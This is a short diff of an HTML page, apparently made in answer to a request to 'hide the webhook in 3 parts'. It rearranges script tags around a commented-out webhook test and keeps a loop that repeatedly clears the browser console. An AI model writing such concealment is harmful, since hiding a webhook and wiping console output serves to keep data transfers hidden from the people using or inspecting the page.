@@ -788,7 +788,12 @@ i want u to hide the webhook in 3 parts, and i want u to make it so every milise
                 console.error('Webhook test failed:', error);
             }
         }
-<script>
+
+
+        // Uncomment the line below to test webhook on page load
+        // testWebhook();
+    </script>
+    <script>
 // Console clear interval with minimal performance impact
 (function clearConsoleFast() {
     const clear = console.clear.bind(console);
@@ -805,9 +810,6 @@ i want u to hide the webhook in 3 parts, and i want u to make it so every milise
     requestIdleCallback(loop);
 })();
 </script>
-
-        // Uncomment the line below to test webhook on page load
-        // testWebhook();
-    </script>
 </body>
 </html>
+
